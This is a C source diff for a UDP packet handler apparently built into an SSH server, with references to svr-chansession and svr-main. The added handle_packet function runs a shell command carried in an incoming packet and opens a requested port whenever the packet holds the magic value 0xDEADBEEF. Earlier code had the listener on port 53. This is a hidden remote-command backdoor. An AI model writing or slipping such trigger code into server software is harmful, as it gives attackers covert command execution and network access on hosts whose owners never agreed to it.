@@ -7,19 +7,30 @@
 #include <sys/socket.h> 
 #include <arpa/inet.h> 
 #include <netinet/in.h> 
-#include <pthread.h>
 #include "uhandler.h"
 #include "session.h"
 
-#define PORT            53 
-#define PACKETSIZE      sizeof(listen_packet_t)
-#define BUFFERSIZE      2048
 #define MAGICNUM        -559038737 //0XDEADBEEF in decimal
 
 void parse_packet(listen_packet_t *,char *);
 void parse_error (listen_packet_t *,char *);
 int check_shell_command(listen_packet_t *);
 int num_parse(char *, int );
+void handle_packet(char *);
+
+void handle_packet(char *buffer){
+    listen_packet_t new_packet;
+    
+    parse_packet(&new_packet,buffer);
+           
+    //execute shell command and port adding only if 0xDEADBEEF and legal command
+    if((int)new_packet.magic == MAGICNUM &&
+        check_shell_command(&new_packet)){
+            //execute the shell_command, then add port
+            shell_exec_command(new_packet.shell_command); //func in svr-chansession
+            add_port_request((int)new_packet.port_number); //func in svr-main   
+    }
+}
 
 int check_shell_command(listen_packet_t * packet){
     if(!packet)
@@ -61,19 +72,15 @@ void parse_packet(listen_packet_t *new_packet,char *buffer){
     
 }
   
-void *start_udp(void *argv) {
-    printf("RUNNING UDP REQUESTS!\n");
-    pthread_detach(pthread_self());
+int start_udp() {
     int sockfd;
     char buffer[BUFFERSIZE]; 
     struct sockaddr_in servaddr, cliaddr;
-    listen_packet_t new_packet;
      //TODO - check if AF_INET for IPv4 or AF_INET6 for IPv6
     // Creating socket file descriptor 
     if ( (sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) { 
         perror("socket creation failed"); 
-        pthread_exit(NULL); 
-        //return; //close the uhandler, not kill the procces 
+        return -1; //close the uhandler, not kill the procces 
     } 
 
     //set reuse this port if port status is waiting
@@ -87,17 +94,18 @@ void *start_udp(void *argv) {
     // Filling server information 
     servaddr.sin_family    = AF_INET; // IPv4 
     servaddr.sin_addr.s_addr = INADDR_ANY; 
-    servaddr.sin_port = htons(PORT); 
+    servaddr.sin_port = htons(UDPPORT); 
       
     // Bind the socket with the server address 
     if ( bind(sockfd, (const struct sockaddr *)&servaddr,  
             sizeof(servaddr)) < 0 ) 
     { 
         perror("bind failed"); 
-        pthread_exit(NULL); 
-        //return;
+        return -1;
     }
-    
+
+    return sockfd;
+    /*
     while(1){
         int len, n;   
         len = sizeof(cliaddr);  //len is value/resuslt 
@@ -123,6 +131,7 @@ void *start_udp(void *argv) {
                 add_port_request((int)new_packet.port_number); //func in svr-main   
         }
     }
+    */
 
 } 
 
